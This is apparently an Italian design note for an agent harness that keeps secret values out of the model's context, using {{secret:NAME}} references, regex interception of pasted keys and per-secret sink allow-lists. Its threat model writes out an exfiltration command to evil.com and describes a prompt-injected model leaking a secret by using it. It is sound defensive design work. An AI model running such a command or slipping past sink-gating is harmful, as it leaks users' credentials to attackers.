---
name: sealed-secrets
description: "Gestione secret negli agenti: il VALORE non entra mai nel context del modello (sealed); il modello usa riferimenti {{secret:NAME}} sostituiti al confine del tool, con sink-gating per-secret. 3 vie di provisioning + regex-ingress. Design, non ancora implementato."
type: concept
status: design-draft
tags: [security, secrets, harness, guardrail, prompt-injection, training-vs-harness]
sources:
  - TG utente 2026-06-30 msg 577 (secret-vars: modello vede nome/descrizione, non il valore; ask-secret / terminale)
  - TG utente 2026-06-30 msg 578/579 (regex-ingress interception + ask-confirm sui falsi-positivi)
last_updated: 2026-06-30
---

# Sealed secrets — secret-reference per agenti

> **STATUS: DESIGN (non implementato).** Idea utente msg 577/578/579. Estende l'infra esistente (`secrets-guardrail`/`secrets-registry`/`secrets-redact`). Build da fare (centrato sul sink-gating, non sullo storage).

## Problema

Un agente ha bisogno di USARE segreti (API key, token) per eseguire operazioni, ma il **valore del segreto non deve mai**: (a) entrare nel context del modello (→ niente leak via output, niente invio al provider LM, niente memorizzazione/training), (b) finire nella persistenza in chiaro, (c) essere esfiltrabile da un modello prompt-injected. Oggi `add_secret` è un TOOL che il modello chiama → il valore è GIÀ nel suo context quando lo registra: gap.

## Catena (why → problema → soluzione)

- **WHY**: il modello deve operare con segreti "in tranquillità" (msg 577) senza vederli.
- **PROBLEMA**: due minacce DIVERSE — (1) **incidenti** (chiave incollata per sbaglio, tool che legge un `.env`); (2) **attacchi** (modello prompt-injected che USA un secret sigillato in un sink ostile: `curl evil.com?k={{secret:X}}` → lo ruba senza averlo mai visto = **exfiltration-via-use**). Lo storage sicuro NON copre la #2.
- **SOLUZIONE**: pattern **sealed-secret / secret-reference**: valore out-of-band nel registry; il modello vede solo **nome + descrizione** e usa **`{{secret:NAME}}`**; l'harness sostituisce il valore reale **al confine `tool_call`**, SOLO verso sink allow-listed; egress-redaction come backstop.

## Componenti

### 1. Registry sigillato
- `secrets` table/registry: `{name, description, value(sealed), allowed_sinks[], created, source}`. Il `value` non è mai esposto a tool di lettura.
- `list_secrets()` (tool model-facing) → ritorna SOLO `[{name, description, allowed_sinks}]`, **mai il valore**. Il modello sa cosa esiste e a cosa serve.

### 2. Tre vie di PROVISIONING (il valore non passa MAI dal modello)
1. **Terminale esplicito**: `set_secret NAME <value> --desc "..." --allow-host api.openai.com` (CLI/tool harness-side) → scrive nel registry. Il modello non è coinvolto.
2. **Model ask-secret**: il modello, accorgendosi che gli serve un segreto per un'operazione, invoca `ask_secret(name, why)` → l'harness mostra a TE un box "il modello chiede il secret NAME per X — inserisci il valore" → il valore va dritto nel registry, **non torna al modello**.
3. **Regex-ingress con conferma** (msg 578/579): su **input utente** o **tool-result**, se un valore matcha un pattern-secret (riuso dei pattern esistenti: `AIza…`/`sk-…`/JWT/`github_pat_…`/`Bearer`), l'harness **intercetta PRIMA che vada al LM** e lo **sigilla** sostituendolo con un riferimento. Per i falsi-positivi → **ask-confirm**: "sembra un secret (pattern X) — lo sigillo? nome/descrizione?". Blocca l'incidente #1 (paste accidentale).

### 3. Reference-injection (uso)
- Il modello mette `{{secret:NAME}}` negli args di un tool (bash, http, …).
- Hook `tool_call`: l'harness **sostituisce** `{{secret:NAME}}` col valore reale PRIMA dell'esecuzione → il valore va all'operazione, **non torna al modello**.
- Egress-redaction (esistente): il valore viene rimosso dal RISULTATO del tool prima che torni al modello.

### 4. Sink-gating per-secret (la VERA sicurezza — il 20% che vale l'80%)
- Ogni secret dichiara `allowed_sinks` (es. host fidati: `api.openai.com`). La sostituzione `{{secret:NAME}}` avviene **SOLO** se la destinazione dell'operazione è allow-listed.
- Blocco di sink ostili/esfiltranti: `echo {{secret}} > file`, outbound verso host non-allow-listed, scrittura in una var. Si aggancia al **pre-flight** esistente.
- Difende dall'**exfiltration-via-use** (il modello non vede il valore ma potrebbe usarlo per spedirlo altrove). **Senza sink-gating, il sealed-secret è teatro.**

## Config (opt-in, gemello degli altri toggle)
- `secrets.regexIngress = off | ask | auto` (default **ask**): `auto` sigilla solo i pattern ad alta confidenza (AIza/sk-ant/github_pat — pochi falsi-positivi), chiede sugli ambigui; `off` disattiva.
- (eventuale) `secrets.sinkGating = strict | warn | off` (default strict per i secret con `allowed_sinks` dichiarati).

## Classificazione training-vs-harness (regola #11)
- **F-harness PIENA**: store sigillato + `list_secrets`(nome/desc) + reference-injection + egress-redaction + **sink-gating** + regex-ingress. Tutto deterministico, niente training.
- **S (DEGRADATA-MA-UTILE)**: il modello sa QUANDO/QUALE secret serve + usa `{{secret:NAME}}` + invoca `ask_secret`. Stato-senza-training: il modello vede la lista e i riferimenti → usabile; un fallback deterministico può anche auto-suggerire il secret per operazioni note. **Reward sull'OUTCOME** (operazione riuscita SENZA leak), mai sul "ha usato un secret".

## Stratificazione delle difese (non illudersi)
| difesa | contro | garanzia |
|---|---|---|
| valore mai-in-context (provisioning out-of-band + ref-injection) | leak via output/provider/training | forte (per i secret sealed) |
| regex-ingress + ask-confirm | INCIDENTI (paste accidentale, .env letto) | riduce, non azzera (una regex non becca tutto) |
| egress-redaction | valore che ricompare in un output | best-effort (un modello può trasformarlo/encodare) |
| **sink-gating per-secret** | **ATTACCHI** (exfiltration-via-use, prompt-injection) | **è la sicurezza vera** |

## Cosa abbiamo già vs nuovo
- **Già**: pattern statici (`secrets-redact.mjs`), egress-redaction su `tool_result` + dynamic-map opaca (`secrets-guardrail.ts`), `add_secret` con guardia min-len/distinct (`secrets-registry.mjs`).
- **Nuovo**: provisioning out-of-band (terminale + ask-secret) così il valore non passa dal modello · `list_secrets`(nome/desc) · reference-injection `{{secret:NAME}}` al `tool_call` · **sink-gating per-secret** · regex-ingress-con-conferma · config.

## Open questions
- Modello di sink-gating: allow-host per-secret (forte) vs deny-list di sink-esfiltranti (più semplice da iniziare) vs taint-tracking (pesante)? → reco: allow-host per-secret, con deny-list come default conservativo per i secret senza `allowed_sinks`.
- `ask_secret` headless (cron/SDK senza TUI): come si chiede il valore? → forse non-disponibile headless (il secret deve essere pre-provisionato da terminale).
- Verifica/testbook: probe "il modello esegue l'operazione usando `{{secret:X}}` e l'output NON contiene mai il valore" + red-team "modello indotto a esfiltrare → sink-gating blocca".

## Link
- [[concepts/secret-section-exfiltration-defense]] (difesa esfiltrazione, parente)
- [[concepts/training-vs-harness-classification]] (F/S)
- `harness/.pi/extensions/secrets-guardrail.ts` · `harness/src/secrets-registry.mjs` · `harness/src/secrets-redact.mjs` (infra esistente)
- [[concepts/untrusted-content-delimiting]] (inbox/tool-result come dato, non istruzioni — vettore della exfiltration-via-use)
